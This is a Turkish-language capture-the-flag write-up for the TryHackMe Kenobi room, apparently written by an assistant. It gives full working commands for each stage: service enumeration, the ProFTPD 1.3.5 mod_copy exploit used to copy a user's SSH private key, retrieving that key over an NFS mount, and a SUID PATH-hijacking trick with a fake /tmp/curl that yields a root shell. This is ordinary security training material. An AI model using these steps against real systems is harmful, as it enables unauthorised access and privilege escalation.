---

```markdown
# TryHackMe – Kenobi Write-up (Türkçe)

Bu write‑up, **Kenobi** odasının adım adım çözümünü, karşılaşılan sorunları ve her aşamanın **neden** yapıldığını açıklayarak sunar.

---

## 📌 İçindekiler

1. [Keşif (Enumeration)](#1-keşif-enumeration)
   - [Nmap Taraması](#11-nmap-ile-açık-portların-taranması)
   - [SMB – Bilgi Sızdırma](#12-smb--bilgi-sızdırma)
   - [FTP – Versiyon ve Exploit](#13-ftp--versiyon-tespiti-ve-exploit-arama)
   - [NFS – Paylaşımları Keşfetme](#14-nfs--paylaşılan-dizinleri-keşfetme)
2. [İlk Erişim (Initial Access)](#2-ilk-erişim-initial-access)
   - [mod_copy ile SSH Key Kopyalama](#21-proftpd-mod_copy-ile-ssh-keyi-kopyalama)
   - [NFS Mount ve Key’i Alma](#22-nfs-ile-var-dizininin-mount-edilmesi)
   - [SSH ile Kenobi’ye Giriş](#23-ssh-ile-kenobi-kullanıcısına-giriş)
3. [Yetki Yükseltme (Privilege Escalation)](#3-yetki-yükseltme-privilege-escalation)
   - [SUID Dosyalarını Bulma](#31-suid-bitine-sahip-dosyaları-bulma)
   - [Binary İnceleme – strings](#32-binaryi-inceleme--strings)
   - [PATH Hijacking ile Root Shell](#33-path-hijacking-ile-root-shell)
   - [Root Flag](#34-root-flagi-okuma)
4. [Karşılaşılan Sorunlar ve Çözümleri](#4-karşılaşılan-sorunlar-ve-çözümleri)
5. [Saldırı Zinciri Özeti](#5-saldırı-zinciri-özeti)
6. [Kullanılan Araçlar](#6-kullanılan-araçlar-tools-used)
7. [Sonuç](#7-sonuç)

---

## 1. Keşif (Enumeration)

### 1.1 Nmap ile Açık Portların Taranması

Hedef makinede hangi servislerin çalıştığını öğrenmek için Nmap kullandık.

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

- `-sC` : varsayılan script'leri çalıştır
- `-sV` : servis versiyonlarını tespit et
- `-oN` : çıktıyı dosyaya kaydet

**Sonuç:** 7 açık port bulundu. Öne çıkanlar:

| Port | Servis      | Versiyon               |
|------|-------------|------------------------|
| 21   | FTP         | ProFTPD 1.3.5          |
| 111  | RPC/NFS     | rpcbind                |
| 139  | SMB         | (NetBIOS)              |
| 445  | SMB         | Microsoft Windows smb  |

Bu üç servis (FTP, SMB, NFS) bize saldırı yüzeyi sunuyor.

---

### 1.2 SMB – Bilgi Sızdırma

SMB paylaşımlarını listeleyelim:

```bash
smbclient -L //<TARGET_IP>/anonymous
```

`anonymous` adlı bir paylaşım bulduk. Bağlanıp içeriğe bakalım:

```bash
smbclient //<TARGET_IP>/anonymous
```

`log.txt` dosyasını indirip inceleyelim:

```bash
get log.txt
cat log.txt
```

`log.txt` içinde kritik bilgiler:

- **Kenobi** kullanıcısı için bir SSH key oluşturulmuş.
- ProFTPD ile ilgili konfigürasyon bilgileri.

Böylece hedef kullanıcı adını (`kenobi`) öğrendik ve sistemde bir SSH private key’in varlığından haberdar olduk.

---

### 1.3 FTP – Versiyon Tespiti ve Exploit Arama

FTP portuna netcat ile bağlanalım:

```bash
nc <TARGET_IP> 21
```

Banner:

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
```

Versiyon **1.3.5**. Şimdi bu versiyona özel exploit’leri arayalım:

```bash
searchsploit proftpd 1.3.5
```

Çıktıda **4** exploit görünüyor. Bunlardan biri **mod_copy** modülü ile ilgili.  
mod_copy, `SITE CPFR` ve `SITE CPTO` komutlarını sağlar ve **kimlik doğrulaması olmadan** dosya kopyalamaya izin verir.

---

### 1.4 NFS – Paylaşılan Dizinleri Keşfetme

NFS (Network File System) hangi dizinleri paylaşıyor, öğrenelim:

```bash
nmap -p 111 --script=nfs-showmount <TARGET_IP>
```

veya

```bash
showmount -e <TARGET_IP>
```

Sonuç: `/var` dizini NFS üzerinden dışa açılmış.

---

## 2. İlk Erişim (Initial Access)

### 2.1 ProFTPD mod_copy ile SSH Key’i Kopyalama

Elimizdeki bilgiler:

- Kenobi’nin SSH key’i muhtemelen `/home/kenobi/.ssh/id_rsa`
- NFS ile `/var` dizinine erişebiliyoruz
- FTP’deki mod_copy açığı ile dosyaları kopyalayabiliyoruz

Plan: key’i `/home/kenobi/.ssh/id_rsa`’dan `/var/tmp/id_rsa`’ya kopyalayıp, NFS üzerinden almak.

**FTP’ye Bağlanma ve Komutları Gönderme**

FTP client ile bağlanırken **anonymous** kullanıcı adını kullanmalıyız, aksi takdirde login başarısız olur ve `SITE` komutları çalışmaz.

```bash
ftp <TARGET_IP>
```

- Kullanıcı adı: `anonymous`
- Şifre: (boş bırak veya `anonymous` yaz)

Başarılı girişten sonra:

```ftp
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Eğer `?Invalid command` hatası alırsanız, **netcat** ile ham bağlantı kurarak komutları göndermeyi deneyin:

```bash
nc <TARGET_IP> 21
```

Bağlandıktan sonra doğrudan yazın:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Başarılı olursa sunucu `250` ile cevap verir.

---

### 2.2 NFS ile `/var` Dizininin Mount Edilmesi

Kendi Kali makinemizde bir dizin oluşturup NFS paylaşımını mount edelim:

```bash
mkdir /mnt/kenobiNFS
mount <TARGET_IP>:/var /mnt/kenobiNFS
```

Artık `/mnt/kenobiNFS/tmp/id_rsa` dosyasına erişebiliriz:

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

---

### 2.3 SSH ile Kenobi Kullanıcısına Giriş

```bash
ssh -i id_rsa kenobi@<TARGET_IP>
```

**Sorun:** Eski SSH sunucuları `ssh-rsa` algoritmasını kullanır, yeni OpenSSH sürümleri ise bu algoritmayı varsayılan olarak devre dışı bırakır.  
Bu hatayı çözmek için:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa kenobi@<TARGET_IP>
```

Artık `kenobi` kullanıcısı olarak oturum açtık.

---

## 3. Yetki Yükseltme (Privilege Escalation)

### 3.1 SUID Bitine Sahip Dosyaları Bulma

```bash
find / -perm -u=s -type f 2>/dev/null
```

Çıktıda alışılmadık bir dosya dikkatimizi çekiyor:

```
/usr/bin/menu
```

Bu binary’nin sahibi **root** ve SUID biti aktif. Yani root yetkileriyle çalışıyor.

---

### 3.2 Binary’i İnceleme – strings

```bash
strings /usr/bin/menu
```

Gördüğümüz satırlar:

```
curl -I localhost
uname -r
ifconfig
```

Bu, programın seçeneklere göre çalıştırdığı komutlar.  
Önemli nokta: `curl`, `uname` ve `ifconfig` **tam yol** ile değil, sadece isimleriyle çağrılıyor.  
Yani program, bu komutları `PATH` değişkeni üzerinden buluyor.

---

### 3.3 PATH Hijacking ile Root Shell

`/usr/bin/menu` root yetkisinde çalıştığı için, eğer `curl` yerine kendi hazırladığımız bir kabuk çalıştırırsak root shell elde ederiz.

1. Sahte bir `curl` oluşturalım:

```bash
echo '/bin/sh' > /tmp/curl
chmod 777 /tmp/curl
```

2. PATH’i değiştirerek `/tmp`’yi öne alalım:

```bash
export PATH=/tmp:$PATH
```

3. Artık `menu` çalıştırıldığında `curl` yerine bizim `/tmp/curl` çalışacak ve bir shell açılacak.

```bash
/usr/bin/menu
```

Seçeneklerden **1** (status check) seçelim, çünkü bu seçenek `curl`’u çağırıyor.

Karşımıza root shell gelir:

```bash
whoami
# root
```

---

### 3.4 Root Flag’i Okuma

```bash
cat /root/root.txt
```

Flag'i elde ettik.

---

## 4. Karşılaşılan Sorunlar ve Çözümleri

### Sorun 1: FTP Login Hatası

`ftp` komutunda varsayılan kullanıcı adı sistemdeki kullanıcı adı (`kali`) oluyor. Doğru kullanıcı `anonymous` olmalı.

**Çözüm:** Bağlanırken kullanıcı adını manuel girin:

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: (boş)
```

### Sorun 2: `SITE CPFR` Komutunun Çalışmaması (`?Invalid command`)

Bu genellikle iki nedenden olur:

- FTP oturumu açılmamış (anonymous login başarısız)
- FTP client’ınız `SITE` komutlarını desteklemiyor olabilir

**Çözüm:** Netcat ile ham bağlantı kurup komutları doğrudan gönderin.

```bash
nc <TARGET_IP> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### Sorun 3: SSH Bağlantı Hatası (`no matching host key type found`)

Eski sunucular `ssh-rsa` kullanır, yeni istemciler bu algoritmayı reddeder.

**Çözüm:** Aşağıdaki parametrelerle bağlanın:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa kenobi@<TARGET_IP>
```

Kalıcı çözüm için `~/.ssh/config` dosyasına şunları ekleyebilirsiniz:

```
Host <TARGET_IP>
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```

---

## 5. Saldırı Zinciri Özeti

```
Nmap
 │
 ├── SMB (anonymous) → log.txt → Kenobi kullanıcısı ve SSH key bilgisi
 │
 ├── FTP (ProFTPD 1.3.5) → searchsploit → mod_copy açığı
 │    │
 │    └── SITE CPFR/CPTO ile /home/kenobi/.ssh/id_rsa → /var/tmp/id_rsa
 │
 ├── NFS (showmount) → /var paylaşımı
 │    │
 │    └── mount /var → /mnt/kenobiNFS → id_rsa dosyasını alma
 │
 └── SSH → Kenobi kullanıcısı
      │
      └── SUID enumeration → /usr/bin/menu
           │
           ├── strings → curl, uname, ifconfig (tam yol yok)
           │
           ├── PATH hijacking → /tmp/curl (shell)
           │
           └── menu çalıştır → root shell → /root/root.txt
```

---

## 6. Kullanılan Araçlar (Tools Used)

- `nmap`
- `smbclient`
- `ftp` / `netcat`
- `searchsploit`
- `showmount` / `mount`
- `ssh`
- `strings`
- `find`
- `echo`, `chmod`, `export`

---

## 7. Sonuç

Bu oda, **bilgi sızdıran servislerin** (SMB, FTP, NFS) nasıl birleştirilerek kritik dosyalara erişilebileceğini ve **SUID + PATH hijacking** ile root olunabileceğini gösteriyor.  
Her adımda elde edilen küçük ipuçları, bir sonraki aşamanın kapısını açıyor. Unutmayın: **enumeration** her şeyin başlangıcıdır.

---

**Flags:**

- User flag: `/home/kenobi/user.txt` (odanın içinde bulunur)
- Root flag: `/root/root.txt`
```

---

Bu içeriği bir metin dosyasına kopyalayıp `kenobi-writeup.md` olarak kaydedebilirsin. İstersen başlıkları, kod bloklarını ve tabloları dilediğin gibi düzenleyebilirsin.
